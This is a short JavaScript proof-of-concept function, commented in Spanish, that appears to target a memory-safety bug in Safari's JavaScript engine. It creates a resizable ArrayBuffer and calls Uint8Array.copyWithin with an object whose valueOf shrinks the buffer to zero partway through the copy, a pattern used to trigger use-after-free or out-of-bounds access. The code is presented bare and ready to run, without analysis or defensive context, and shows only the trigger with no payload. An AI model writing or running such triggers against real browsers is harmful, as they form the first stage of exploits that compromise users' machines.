function ejecutarPoC() {
  try {
    // Paso 1: Crear un ArrayBuffer redimensionable de 0x1000 bytes con un tamaño máximo de 0x4000 bytes
    const buffer = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });

    // Paso 2: Crear un Uint8Array basado en el buffer
    const view = new Uint8Array(buffer);

    // Paso 3: Definir una función que reduce el tamaño del buffer a cero
    function shrinkBuffer() {
      buffer.resize(0); // Requiere Safari con soporte para ArrayBuffer redimensionable
      return 0;
    }

    // Paso 4: Invocar copyWithin con un objeto que tiene valueOf para manipular el buffer durante la operación
    view.copyWithin(0x20, { valueOf: shrinkBuffer });

    console.log("PoC ejecutada.");
  } catch (e) {
    console.error("Error al ejecutar la PoC:", e);
  }
}
